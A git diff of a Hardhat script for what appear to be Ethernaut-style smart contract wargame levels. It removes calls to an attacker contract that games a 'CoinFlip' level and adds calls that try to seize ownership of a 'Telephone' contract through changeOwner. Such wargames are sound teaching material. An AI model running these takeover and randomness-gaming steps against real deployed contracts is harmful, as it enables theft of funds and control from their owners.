@@ -1,31 +1,27 @@
 import { ethers } from "hardhat";
-const CONTRACT_ADDRESS = "0xd5aCD6fc77F520c6EA3442C0A9390A9d61A19B43";
-// const ATTACKER_ADDRESS = //This is the instance address
-const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
-const ATTACK_CONTRACT_ADDRESS = "0xfEdda6cE6205A2CA6c58fB9FB1478738D8D1920C";
 
+const CONTRACT_ADDRESS = "0x290665897E441317ec52b664B1a6e6601d6312F5";
+const PLAYER_ADDRES = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
 async function main() {
-  const signer = await ethers.getSigner(PLAYER_ADDRESS);
-
+  const signer = await ethers.getSigner(PLAYER_ADDRES);
   const contract = await ethers.getContractAt(
-    "CoinFlip",
+    "Telephone",
     CONTRACT_ADDRESS,
     signer
   );
 
-  const attackContract = await ethers.getContractAt(
-    "Attacker",
-    ATTACK_CONTRACT_ADDRESS,
-    signer
-  );
+  let contractOwner = await contract.owner();
+
+  console.log(`The current contract owner is: ${contractOwner}`);
 
   console.log(
-    `make a test flip: `,
-    await attackContract.sendDeterminedSide({ gasLimit: 5000000 })
+    `Lets call the change owner function and see who the new owner is? `
   );
 
-  console.log("the consecutive wins are: ", await contract.consecutiveWins());
-  // see if I won the flip
+  await contract.changeOwner("0x81215d34367AF48d01E728AfF2976d9Df32fE604");
+
+  let contractNewOwner = await contract.owner();
+  console.log(`The newly passed contract owner is: ${contractNewOwner} `);
 }
 
 // We recommend this pattern to be able to use async/await everywhere
